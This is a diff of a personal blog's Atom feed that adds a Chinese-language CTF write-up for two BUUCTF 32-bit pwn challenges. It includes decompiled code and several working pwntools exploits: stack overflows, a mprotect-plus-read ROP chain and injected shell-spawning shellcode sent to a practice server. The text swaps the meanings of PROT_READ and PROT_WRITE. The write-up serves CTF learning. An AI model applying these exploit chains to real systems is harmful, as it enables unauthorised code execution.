@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-07-31T13:00:46.144Z</updated>
+    <updated>2021-08-01T13:37:41.851Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -10,6 +10,187 @@
     <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
     <icon>https://cc-nianchu.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, nianchu</rights>
+    <entry>
+        <title type="html"><![CDATA[每日3+]]></title>
+        <id>https://cc-nianchu.github.io/post/mei-ri-3/</id>
+        <link href="https://cc-nianchu.github.io/post/mei-ri-3/">
+        </link>
+        <updated>2021-08-01T13:36:17.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="the-first-titleget_started_3dsctf_2016">the first title:get_started_3dsctf_2016</h2>
+<p>拿到附件先checksec get_started_3dsctf_2016</p>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>发现这是32位系统开了NX保护打开ida32</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[56]; // [esp+4h] [ebp-38h] BYREF
+
+  printf(&quot;Qual a palavrinha magica? &quot;, v4[0]);
+  gets(v4);
+  return 0;
+}
+void __cdecl get_flag(int a1, int a2)
+{
+  int v2; // esi
+  unsigned __int8 v3; // al
+  int v4; // ecx
+  unsigned __int8 v5; // al
+
+  if ( a1 == 814536271 &amp;&amp; a2 == 425138641 )
+  {
+    v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;);
+    v3 = getc(v2);
+    if ( v3 != 255 )
+    {
+      v4 = (char)v3;
+      do
+      {
+        putchar(v4);
+        v5 = getc(v2);
+        v4 = (char)v5;
+      }
+      while ( v5 != 255 );
+    }
+    fclose(v2);
+  }
+}
+</code></pre>
+<p>在这里看到main函数是可以进行溢出的，而且有get_flag的函数，就是通过main函数溢出到返回地址的时候直接溢出到if条件判断里面。<br>
+原本以为就是单纯一个很简单的溢出+后门函数但是上了EXP之后一直无法拿到flag很觉得很奇怪然后上了百度。。<br>
+<img src="https://cc-nianchu.github.io/post-images/1627825028037.jpg" alt="" loading="lazy"><br>
+我一开始的exp:</p>
+<pre><code>from pwn import*
+
+#q = process('./get_started_3dsctf_2016')
+q=remote(&quot;node4.buuoj.cn&quot;,25415)
+
+payload = 'a'*56
+payload += p32(0x080489B8)
+q.sendline(payload)
+q.interactive()
+</code></pre>
+<p>然后上了百度看到一个博主说打远程时候如果程序是异常退出的话最后是不给你回显的。所以我们得想办法让程序正常退出。<br>
+有2种方法:<br>
+第一种办法:<br>
+不绕过if判断返回地址溢出变成带参数<br>
+答案是可以的，大概就是这么布局：'a'*溢出量 + 'ebp' + get_flag + get_flag的返回地址 + 参数1 + 参数2<br>
+exp:</p>
+<pre><code>from pwn import *
+q = remote('node4.buuoj.cn',25415)
+#q = process('./get_started_3dsctf_2016')
+payload = 'a'*56
+payload += p32(0x080489A0) + p32(0x0804E6A0)
+payload += p32(0x308CD64F) + p32(0x195719D1)
+q.sendline(payload)
+q.interactive()
+</code></pre>
+<p>这种是可以拿到flag的，但是我发现别的大佬都是给.bss赋值给权限然后再.bss访问。<br>
+有这么一个函数，mprotect，我们先来学习一下。</p>
+<p>int mprotect(const void *start, size_t len, int prot);</p>
+<p>第一个参数填的是一个地址，是指需要进行操作的地址。</p>
+<p>第二个参数是地址往后多大的长度。</p>
+<p>第三个参数的是要赋予的权限。</p>
+<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
+<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
+<p>1）PROT_READ：表示内存段内的内容可写；</p>
+<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
+<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
+<p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
+<p>prot=7 是可读可写可执行<br>
+需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>
+EXP:如下</p>
+<pre><code>from pwn import *
+q = remote('node4.buuoj.cn',25415)
+#q = process('./get_started_3dsctf_2016')
+context.log_level = 'debug'
+
+mprotect = 0x0806EC80
+buf = 0x80ea000
+pop_3_ret = 0x0804f460
+read_addr = 0x0806E140
+
+payload = 'a'*56
+payload += p32(mprotect)
+payload += p32(pop_3_ret)
+payload += p32(buf)
+payload += p32(0x1000)
+payload += p32(0x7)
+payload += p32(read_addr)
+payload += p32(buf)
+payload += p32(0)
+payload += p32(buf)
+payload += p32(0x100)
+q.sendline(payload)
+
+shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
+q.sendline(shellcode)
+
+q.interactive()
+</code></pre>
+<p>一道题花费了3个多小时，发现自己是真的菜！！！</p>
+<h2 id="the-second-titlenot_the_same_3dsctf_2016buu">the second title:not_the_same_3dsctf_2016(buu)</h2>
+<p>在buu上拿到附件，然后打开ubuntu checksec 一下</p>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+</code></pre>
+<p>发现开了NX保护，32位系统，打开ida32</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF
+
+  printf(&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;);
+  gets(v4);
+  return 0;
+}
+int get_secret()
+{
+  int v0; // esi
+
+  v0 = fopen(&quot;flag.txt&quot;, &amp;unk_80CF91B);
+  fgets(&amp;fl4g, 45, v0);
+  return fclose(v0);
+}
+</code></pre>
+<p>发现gets()函数，可以进行溢出，然后覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容。。但是做不出来<br>
+然后被迫看wp,发现fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。<br>
+然后用mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似<br>
+由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8</p>
+<pre><code> ROPgadget --binary not_the_same_3dsctf_2016 --only &quot;pop|ret&quot;|grep pop
+</code></pre>
+<p>EXP:</p>
+<pre><code>from pwn import*
+
+r=remote('node4.buuoj.cn',25899)
+elf=ELF('not_the_same_3dsctf_2016')
+read_addr=elf.symbols['read']
+mprotect=0x806ED40
+addr=0x80eb000
+p3_ret=0x806fcc8
+
+shellcode=asm(shellcraft.sh())
+
+payload  ='a'*0x2d+p32(mprotect)+p32(p3_ret)
+payload +=p32(addr)+p32(0x100)+p32(0x7)
+
+payload +=p32(read_addr)+p32(p3_ret)
+
+payload +=p32(0)+p32(addr)+p32(len(shellcode))+p32(addr)
+
+r.sendline(payload)
+r.sendline(shellcode)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[每日3+道题，之前被迫出门7天正式回归]]></title>
         <id>https://cc-nianchu.github.io/post/mei-ri-3dao-ti-zhi-qian-bei-po-chu-men-7-tian-zheng-shi-hui-gui/</id>
